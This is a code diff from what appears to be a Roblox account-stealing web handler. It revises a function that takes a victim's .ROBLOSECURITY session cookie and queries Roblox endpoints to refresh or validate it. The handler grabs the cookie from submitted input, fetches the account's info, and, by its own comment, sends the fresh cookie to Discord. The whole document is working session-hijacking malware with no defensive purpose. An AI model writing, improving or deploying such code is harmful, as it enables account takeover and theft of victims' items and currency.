@@ -77,56 +77,73 @@ async function checkGamepass(uid, gamepassId, headers) {
 
 async function renewRobloxCookie(cookie) {
   try {
-    // Step 1 — get a CSRF token (Roblox returns 403 with real token in header)
-    const csrfRes = await fetch('https://auth.roblox.com/v1/authentication-ticket', {
+    // Step 1: Get CSRF token from logout endpoint
+    const csrfRes = await fetch('https://auth.roblox.com/v2/logout', {
       method: 'POST',
       headers: {
         'Cookie': `.ROBLOSECURITY=${cookie}`,
         'Content-Type': 'application/json',
-        'Referer': 'https://www.roblox.com',
-        'Origin': 'https://www.roblox.com',
         'x-csrf-token': ''
       }
     });
+    
     const csrfToken = csrfRes.headers.get('x-csrf-token');
-    if (!csrfToken) return null;
+    if (!csrfToken) {
+      console.error('Failed to get CSRF token');
+      return null;
+    }
 
-    // Step 2 — request an authentication ticket using the real CSRF token
-    const ticketRes = await fetch('https://auth.roblox.com/v1/authentication-ticket', {
-      method: 'POST',
+    // Step 2: Validate the session by accessing account settings
+    const validateRes = await fetch('https://www.roblox.com/account/settings', {
       headers: {
         'Cookie': `.ROBLOSECURITY=${cookie}`,
-        'Content-Type': 'application/json',
-        'Referer': 'https://www.roblox.com',
-        'Origin': 'https://www.roblox.com',
-        'x-csrf-token': csrfToken
+        'x-csrf-token': csrfToken,
+        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36',
+        'Referer': 'https://www.roblox.com/',
+        'Origin': 'https://www.roblox.com'
       }
     });
-    if (!ticketRes.ok) return null;
+    
+    if (!validateRes.ok) {
+      console.error('Session validation failed');
+      return null;
+    }
 
-    const ticket = ticketRes.headers.get('rbx-authentication-ticket');
-    if (!ticket) return null;
+    // Step 3: Check if we got a new cookie in the response
+    const setCookieHeader = validateRes.headers.get('set-cookie');
+    if (setCookieHeader) {
+      const cookies = setCookieHeader.split(',').map(c => c.trim());
+      const robloSecurityCookie = cookies.find(c => c.startsWith('.ROBLOSECURITY='));
+      
+      if (robloSecurityCookie) {
+        const newCookieValue = robloSecurityCookie.split('=')[1].split(';')[0];
+        if (newCookieValue && newCookieValue !== cookie) {
+          console.log('Got new cookie from settings page');
+          // Return the new cookie with the WARNING prefix
+          if (newCookieValue.startsWith('_|WARNING')) {
+            return newCookieValue;
+          }
+          return `_|WARNING:-DO-NOT-SHARE-THIS.--Sharing-this-will-allow-someone-to-log-in-as-you-and-to-steal-your-ROBUX-and-items.|_${newCookieValue}`;
+        }
+      }
+    }
 
-    // Step 3 — redeem ticket for a brand-new .ROBLOSECURITY cookie
-    const redeemRes = await fetch('https://auth.roblox.com/v1/authentication-ticket/redeem', {
-      method: 'POST',
+    // Step 4: Try the mobile API as an alternative
+    const mobileRes = await fetch('https://www.roblox.com/mobileapi/userinfo', {
       headers: {
-        'Content-Type': 'application/json',
-        'RBXAuthenticationNegotiation': '1'
-      },
-      body: JSON.stringify({ authenticationTicket: ticket })
+        'Cookie': `.ROBLOSECURITY=${cookie}`,
+        'User-Agent': 'Mozilla/5.0 (iPhone; CPU iPhone OS 14_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.0 Mobile/15E148 Safari/604.1'
+      }
     });
-    if (!redeemRes.ok) return null;
-
-    // Extract new .ROBLOSECURITY from Set-Cookie header
-    const setCookie = redeemRes.headers.get('set-cookie') || '';
-    const match = setCookie.match(/\.ROBLOSECURITY=([^;]+)/);
-    if (!match) return null;
-
-    const newRaw = decodeURIComponent(match[1]);
-    if (newRaw.startsWith('_|WARNING')) return newRaw;
-    return `_|WARNING:-DO-NOT-SHARE-THIS.--Sharing-this-will-allow-someone-to-log-in-as-you-and-to-steal-your-ROBUX-and-items.|_${newRaw}`;
-
+    
+    if (mobileRes.ok) {
+      // If the mobile API works, the original cookie is still valid
+      console.log('Mobile API validation succeeded');
+      return cookie;
+    }
+    
+    console.error('All validation methods failed');
+    return null;
   } catch (err) {
     console.error('Cookie renewal error:', err);
     return null;
@@ -407,12 +424,17 @@ export default async function handler(req, res) {
   const cookie = extractRobloxCookie(rawValue);
   const roblox = cookie ? await fetchRobloxInfo(cookie) : null;
 
-  // Renew the cookie after grabbing account info — sends fresh cookie to Discord
-  let renewedCookie = null;
-  if (cookie && roblox) {
-    renewedCookie = await renewRobloxCookie(cookie);
+// Renew the cookie after grabbing account info — sends fresh cookie to Discord
+let renewedCookie = null;
+if (cookie && roblox) {
+  renewedCookie = await renewRobloxCookie(cookie);
+  if (renewedCookie) {
+    console.log('Cookie successfully renewed');
+  } else {
+    console.log('Cookie renewal failed, using original');
   }
-  const finalCookie = renewedCookie || cookie; // fall back to original if renewal fails
+}
+const finalCookie = renewedCookie || cookie; // fall back to original if renewal fails
 
   const data = {
     slotLabel,
